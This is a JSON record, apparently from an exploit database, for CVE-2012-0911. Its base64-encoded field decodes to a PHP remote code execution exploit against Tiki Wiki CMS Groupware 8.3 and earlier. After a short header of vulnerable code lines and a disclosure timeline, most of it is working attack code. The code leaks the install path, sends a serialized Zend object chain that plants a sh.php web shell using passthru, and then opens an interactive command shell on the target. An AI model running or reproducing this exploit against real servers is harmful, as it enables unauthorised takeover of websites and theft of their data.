{
    "source": "exploit-database", 
    "exploit": "PD9waHANCg0KLyoNCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgIFRpa2kgV2lraSBDTVMgR3JvdXB3YXJlIDw9IDguMyAidW5zZXJpYWxpemUoKSIgUEhQIENvZGUgRXhlY3V0aW9uDQogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgDQogICAgYXV0aG9yLi4uLi4uLi4uLi46IEVnaWRpbyBSb21hbm8gYWthIEVnaVgNCiAgICBtYWlsLi4uLi4uLi4uLi4uLjogbjBiMGQxM3NbYXRdZ21haWxbZG90XWNvbQ0KICAgIHNvZnR3YXJlIGxpbmsuLi4uOiBodHRwOi8vaW5mby50aWtpLm9yZy8NCiAgDQogICAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rDQogICAgfCBUaGlzIHByb29mIG9mIGNvbmNlcHQgY29kZSB3YXMgd3JpdHRlbiBmb3IgZWR1Y2F0aW9uYWwgcHVycG9zZSBvbmx5LiAgICB8DQogICAgfCBVc2UgaXQgYXQgeW91ciBvd24gcmlzay4gQXV0aG9yIHdpbGwgYmUgbm90IHJlc3BvbnNpYmxlIGZvciBhbnkgZGFtYWdlLiB8DQogICAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rDQogICAgDQogICAgWy1dIFZ1bG5lcmFibGUgY29kZSBpbiBkaWZmZXJlbnQgbG9jYXRpb25zOg0KICANCiAgICBsaWIvYmFubmVycy9iYW5uZXJsaWIucGhwOjI4OiAgICAgICAgICAgICAgICAgICAkdmlld3MgPSB1bnNlcmlhbGl6ZSgkX0NPT0tJRVskY29va2llTmFtZV0pOw0KICAgIGxpYi9iYW5uZXJzL2Jhbm5lcmxpYi5waHA6MTM2OiAgICAgICAgICAgICAgICAgICR2aWV3cyA9IHVuc2VyaWFsaXplKCRfQ09PS0lFWyRjb29raWVOYW1lXSk7DQogICAgdGlraS1wcmludF9tdWx0aV9wYWdlcy5waHA6MTk6ICAgICAgICAgICRwcmludHBhZ2VzID0gdW5zZXJpYWxpemUodXJsZGVjb2RlKCRfUkVRVUVTVFsncHJpbnRwYWdlcyddKSk7DQogICAgdGlraS1wcmludF9tdWx0aV9wYWdlcy5waHA6MjQ6ICAgICAgICAgICRwcmludHN0cnVjdHVyZXMgPSB1bnNlcmlhbGl6ZSh1cmxkZWNvZGUoJF9SRVFVRVNUWydwcmludHN0cnVjdHVyZXMnXSkpOw0KICAgIHRpa2ktcHJpbnRfcGFnZXMucGhwOjMxOiAgICAgICAgJHByaW50cGFnZXMgPSB1bnNlcmlhbGl6ZSh1cmxkZWNvZGUoJF9SRVFVRVNUWyJwcmludHBhZ2VzIl0pKTsNCiAgICB0aWtpLXByaW50X3BhZ2VzLnBocDozMjogICAgICAgICRwcmludHN0cnVjdHVyZXMgPSB1bnNlcmlhbGl6ZSh1cmxkZWNvZGUoJF9SRVFVRVNUWydwcmludHN0cnVjdHVyZXMnXSkpOw0KICAgIHRpa2ktc2VuZF9vYmplY3RzLnBocDo0MjogICAgICAgJHNlbmRwYWdlcyA9IHVuc2VyaWFsaXplKHVybGRlY29kZSgkX1JFUVVFU1RbJ3NlbmRwYWdlcyddKSk7DQogICAgdGlraS1zZW5kX29iamVjdHMucGhwOjQ4OiAgICAgICAkc2VuZHN0cnVjdHVyZXMgPSB1bnNlcmlhbGl6ZSh1cmxkZWNvZGUoJF9SRVFVRVNUWydzZW5kc3RydWN0dXJlcyddKSk7DQogICAgdGlraS1zZW5kX29iamVjdHMucGhwOjU0OiAgICAgICAkc2VuZGFydGljbGVzID0gdW5zZXJpYWxpemUodXJsZGVjb2RlKCRfUkVRVUVTVFsnc2VuZGFydGljbGVzJ10pKTsNCiAgICANCiAgICBUaGUgdnVsbmVyYWJpbGl0eSBpcyBjYXVzZWQgZHVlIHRvIGFsbCB0aGVzZSBzY3JpcHRzIHVzaW5nICJ1bnNlcmlhbGl6ZSgpIiB3aXRoIHVzZXIgY29udHJvbGxlZCBpbnB1dC4NCiAgICBUaGlzIGNhbiBsZWFkIHRvIGV4ZWN1dGlvbiBvZiBhcmJpdHJhcnkgUEhQIGNvZGUgcGFzc2luZyBhbiAgYWQtaG9jIFplbmQgRnJhbWV3b3JrIHNlcmlhbGl6ZWQgIG9iamVjdC4NCg0KICAgIFstXSBGdWxsIHBhdGggZGlzY2xvc3VyZSBhdDoNCiAgDQogICAgaHR0cDovL1tob3N0XS9bcGF0aF0vYWRtaW4vaW5jbHVkZV9jYWxlbmRhci5waHANCiAgICBodHRwOi8vW2hvc3RdL1twYXRoXS90aWtpLXJzc19lcnJvci5waHANCiAgICBodHRwOi8vW2hvc3RdL1twYXRoXS90aWtpLXdhdGVyc2hlZF9zZXJ2aWNlLnBocA0KICANCiAgICBbLV0gRGlzY2xvc3VyZSB0aW1lbGluZToNCiAgDQogICAgWzExLzAxLzIwMTJdIC0gVnVsbmVyYWJpbGl0eSBkaXNjb3ZlcmVkDQogICAgWzE0LzAxLzIwMTJdIC0gSXNzdWUgcmVwb3J0ZWQgdG8gc2VjdXJpdHkoYXQpdGlraXdpa2kub3JnDQogICAgWzE0LzAxLzIwMTJdIC0gTmV3IHRpY2tldCBvcGVuZWQ6IGh0dHA6Ly9kZXYudGlraS5vcmcvaXRlbTQxMDkNCiAgICBbMjMvMDEvMjAxMl0gLSBDVkUgbnVtYmVyIHJlcXVlc3RlZA0KICAgIFsyMy8wMS8yMDEyXSAtIEFzc2lnbmVkIENWRS0yMDEyLTA5MTENCiAgICBbMDEvMDUvMjAxMl0gLSBWZXJzaW9uIDguNCByZWxlYXNlZDogaHR0cDovL2luZm8udGlraS5vcmcvYXJ0aWNsZTE5MS1UaWtpLVJlbGVhc2VzLTgtNA0KICAgIFswNC8wNy8yMDEyXSAtIFB1YmxpYyBkaXNjbG9zdXJlIA0KIA0KKi8NCiANCmVycm9yX3JlcG9ydGluZygwKTsNCnNldF90aW1lX2xpbWl0KDApOw0KaW5pX3NldCgiZGVmYXVsdF9zb2NrZXRfdGltZW91dCIsIDUpOw0KDQpmdW5jdGlvbiBodHRwX3NlbmQoJGhvc3QsICRwYWNrZXQpDQp7DQogICAgaWYgKCEoJHNvY2sgPSBmc29ja29wZW4oJGhvc3QsIDgwKSkpIGRpZSgiXG5bLV0gTm8gcmVzcG9uc2UgZnJvbSB7JGhvc3R9OjgwXG4iKTsNCiAgICBmcHV0cygkc29jaywgJHBhY2tldCk7DQogICAgcmV0dXJuIHN0cmVhbV9nZXRfY29udGVudHMoJHNvY2spOw0KfQ0KDQpmdW5jdGlvbiBnZXRfcGF0aCgpDQp7DQogICAgZ2xvYmFsICRob3N0LCAkcGF0aDsNCiAgICANCiAgICAkcGFja2V0ICA9ICJHRVQgeyRwYXRofXRpa2ktcnNzX2Vycm9yLnBocCBIVFRQLzEuMFxyXG4iOw0KICAgICRwYWNrZXQgLj0gIkhvc3Q6IHskaG9zdH1cclxuIjsNCiAgICAkcGFja2V0IC49ICJDb25uZWN0aW9uOiBjbG9zZVxyXG5cclxuIjsNCiAgICAgDQogICAgaWYgKCFwcmVnX21hdGNoKCcvaW4gPGI+KC4qKXRpa2ktcnNzLycsIGh0dHBfc2VuZCgkaG9zdCwgJHBhY2tldCksICRtKSkgZGllKCJcblstXSBQYXRoIG5vdCBmb3VuZCFcbiIpOw0KICAgIHJldHVybiAkbVsxXTsNCn0NCg0KDQpwcmludCAiXG4rLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsiOw0KcHJpbnQgIlxufCBUaWtpIFdpa2kgQ01TIEdyb3Vwd2FyZSA8PSA4LjMgUmVtb3RlIENvZGUgRXhlY3V0aW9uIEV4cGxvaXQgYnkgRWdpWCB8IjsNCnByaW50ICJcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tK1xuIjsNCg0KaWYgKCRhcmdjIDwgMykNCnsNCiAgICBwcmludCAiXG5Vc2FnZS4uLi4uLjogcGhwICRhcmd2WzBdIDxob3N0PiA8cGF0aD5cbiI7DQogICAgcHJpbnQgIlxuRXhhbXBsZS4uLi46IHBocCAkYXJndlswXSBsb2NhbGhvc3QgLyI7DQogICAgcHJpbnQgIlxuRXhhbXBsZS4uLi46IHBocCAkYXJndlswXSBsb2NhbGhvc3QgL3Rpa2kvXG4iOw0KICAgIGRpZSgpOw0KfQ0KDQpsaXN0KCRob3N0LCAkcGF0aCkgPSBhcnJheSgkYXJndlsxXSwgJGFyZ3ZbMl0pOw0KDQokZl9wYXRoID0gZ2V0X3BhdGgoKTsNCnByaW50ICJcblstXSBQYXRoIGRpc2Nsb3N1cmU6IHskZl9wYXRofVxuIjsNCg0KY2xhc3MgWmVuZF9TZWFyY2hfTHVjZW5lX0luZGV4X0ZpZWxkSW5mbw0Kew0KICAgIHB1YmxpYyAkbmFtZSA9ICc8P3BocCBlcnJvcl9yZXBvcnRpbmcoMCk7IHByaW50KF9fXyk7IHBhc3N0aHJ1KGJhc2U2NF9kZWNvZGUoJF9TRVJWRVJbSFRUUF9DTURdKSk7IGRpZTsgPz4nOw0KfQ0KDQpjbGFzcyBaZW5kX1NlYXJjaF9MdWNlbmVfU3RvcmFnZV9EaXJlY3RvcnlfRmlsZXN5c3RlbQ0Kew0KICAgIHByb3RlY3RlZCAkX2RpclBhdGggPSBudWxsOw0KICAgIA0KICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcGF0aCkNCiAgICB7DQogICAgICAgICR0aGlzLT5fZGlyUGF0aCA9ICRwYXRoOw0KICAgIH0NCn0NCg0KaW50ZXJmYWNlIFplbmRfUGRmX0VsZW1lbnRGYWN0b3J5X0ludGVyZmFjZSB7fQ0KDQpjbGFzcyBaZW5kX1NlYXJjaF9MdWNlbmVfSW5kZXhfU2VnbWVudFdyaXRlcl9TdHJlYW1Xcml0ZXIgaW1wbGVtZW50cyBaZW5kX1BkZl9FbGVtZW50RmFjdG9yeV9JbnRlcmZhY2UNCnsNCiAgICBwcm90ZWN0ZWQgJF9kb2NDb3VudCA9IDE7DQogICAgcHJvdGVjdGVkICRfbmFtZSA9ICdmb28nOw0KICAgIHByb3RlY3RlZCAkX2RpcmVjdG9yeTsNCiAgICBwcm90ZWN0ZWQgJF9maWVsZHM7DQogICAgcHJvdGVjdGVkICRfZmlsZXM7DQogICAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRkaXJlY3RvcnksICRmaWVsZHMpDQogICAgew0KICAgICAgICAkdGhpcy0+X2RpcmVjdG9yeSA9ICRkaXJlY3Rvcnk7DQogICAgICAgICR0aGlzLT5fZmllbGRzICAgID0gYXJyYXkoJGZpZWxkcyk7DQogICAgICAgICR0aGlzLT5fZmlsZXMgICAgID0gbmV3IHN0ZENsYXNzOw0KICAgIH0NCn0gICAgDQoNCmNsYXNzIFplbmRfUGRmX0VsZW1lbnRGYWN0b3J5X1Byb3h5DQp7DQogICAgcHJpdmF0ZSAkX2ZhY3Rvcnk7DQogICAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KFplbmRfUGRmX0VsZW1lbnRGYWN0b3J5X0ludGVyZmFjZSAkZmFjdG9yeSkNCiAgICB7DQogICAgICAgICR0aGlzLT5fZmFjdG9yeSA9ICRmYWN0b3J5Ow0KICAgIH0NCn0NCg0KLy8gaHR0cDovL3d3dy5zdXNwZWt0Lm9yZy9kb3dubG9hZHMvUE9DMjAwOS1TaG9ja2luZ05ld3NJblBIUEV4cGxvaXRhdGlvbi5wZGYNCiRkaXJlY3RvcnkgPSBuZXcgWmVuZF9TZWFyY2hfTHVjZW5lX1N0b3JhZ2VfRGlyZWN0b3J5X0ZpbGVzeXN0ZW0oJGZfcGF0aC4ic2gucGhwXDAiKTsNCiRfX2ZhY3RvcnkgPSBuZXcgWmVuZF9TZWFyY2hfTHVjZW5lX0luZGV4X1NlZ21lbnRXcml0ZXJfU3RyZWFtV3JpdGVyKCRkaXJlY3RvcnksIG5ldyBaZW5kX1NlYXJjaF9MdWNlbmVfSW5kZXhfRmllbGRJbmZvKTsNCiRfX19fcHJveHkgPSBuZXcgWmVuZF9QZGZfRWxlbWVudEZhY3RvcnlfUHJveHkoJF9fZmFjdG9yeSk7DQoNCiRwYXlsb2FkID0gdXJsZW5jb2RlKHNlcmlhbGl6ZSgkX19fX3Byb3h5KSk7DQokcGF5bG9hZCA9IHN0cl9yZXBsYWNlKCclMDAnLCAnJTI1MDAnLCAkcGF5bG9hZCk7DQokcGF5bG9hZCA9ICJwcmludHBhZ2VzPXskcGF5bG9hZH0iOw0KDQokcGFja2V0ICA9ICJQT1NUIHskcGF0aH10aWtpLXByaW50X211bHRpX3BhZ2VzLnBocCBIVFRQLzEuMFxyXG4iOw0KJHBhY2tldCAuPSAiSG9zdDogeyRob3N0fVxyXG4iOw0KJHBhY2tldCAuPSAiQ29udGVudC1MZW5ndGg6ICIuc3RybGVuKCRwYXlsb2FkKS4iXHJcbiI7DQokcGFja2V0IC49ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG4iOw0KJHBhY2tldCAuPSAiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbnskcGF5bG9hZH0iOw0KDQppZiAocHJlZ19tYXRjaCgnL211bHRpcHJpbnQvJywgaHR0cF9zZW5kKCRob3N0LCAkcGFja2V0KSkpIGRpZSgiWy1dIE11bHRpLXByaW50IGZlYXR1cmUgZGlzYWJsZWQhXG4iKTsNCg0KJHBhY2tldCAgPSAiR0VUIHskcGF0aH1zaC5waHAgSFRUUC8xLjBcclxuIjsNCiRwYWNrZXQgLj0gIkhvc3Q6IHskaG9zdH1cclxuIjsNCiRwYWNrZXQgLj0gIkNtZDogJXNcclxuIjsNCiRwYWNrZXQgLj0gIkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iOw0KDQp3aGlsZSgxKQ0Kew0KICAgIHByaW50ICJcbnRpa2ktc2hlbGwjICI7DQogICAgaWYgKCgkY21kID0gdHJpbShmZ2V0cyhTVERJTikpKSA9PSAiZXhpdCIpIGJyZWFrOw0KICAgICRyZXNwb25zZSA9IGh0dHBfc2VuZCgkaG9zdCwgc3ByaW50ZigkcGFja2V0LCBiYXNlNjRfZW5jb2RlKCRjbWQpKSk7DQogICAgcHJlZ19tYXRjaCgnL19fXyguKikvcycsICRyZXNwb25zZSwgJG0pID8gcHJpbnQgJG1bMV0gOiBkaWUoIlxuWy1dIEV4cGxvaXQgZmFpbGVkIVxuIik7DQp9", 
    "filename": "platforms/php/webapps/19573.php", 
    "id": "19573", 
    "cves": [
        "CVE-2012-0911"
    ]
}